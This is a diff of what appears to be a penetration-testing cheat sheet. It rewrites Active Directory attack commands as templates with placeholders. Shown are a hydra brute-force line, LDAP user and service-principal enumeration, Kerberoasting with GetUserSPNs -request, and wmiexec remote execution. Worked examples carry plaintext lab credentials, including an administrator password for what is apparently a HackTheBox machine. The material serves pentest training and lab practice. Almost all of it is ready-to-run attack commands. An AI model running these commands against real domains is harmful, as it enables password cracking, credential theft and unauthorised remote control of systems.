@@ -146,19 +146,25 @@ hydra -L username.txt -P password.txt 10.0.0.1 smb -V
 ## Port 143
 ## Port 389
 ```
-ldapsearch -x -h 10.0.0.1 -p 389 -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
+\\ With the example test.com : DOMAIN = test and DOMAIN2 = com
+ldapsearch -x -h <IP> -p <PORT> -D 'USERNAME' -w 'PASSWORD' -b "dc=DOMAIN,dc=DOMAIN2" -s sub"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
 
-./GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.129.168.32
+./GetADUsers.py -all DOMAIN/USERNAME -dc-ip <IP>
+./GetADUsers.py -all domain.com/svc_tgs -dc-ip 10.0.0.1
 
 
 ldapsearch -x -h 10.0.0.1 -p 389 -D 'SVC_TGS' -w'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName
 
 
-./GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.0.0.1
+./GetUserSPNs.py DOMAIN/USERNAME -dc-ip <IP>
+**EX:** ./GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.0.0.1
 
-./GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.0.0.1 -request
+./GetUserSPNs.py DOMAIN/USERNAME -dc-ip <IP> -request
+**EX:** ./GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.0.0.1 -request
 
-./wmiexec.py active.htb/administrator:Ticketmaster1968@10.0.0.1
+
+./wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
+**EX:** ./wmiexec.py active.htb/administrator:Ticketmaster1968@10.0.0.1
 ```
 
 
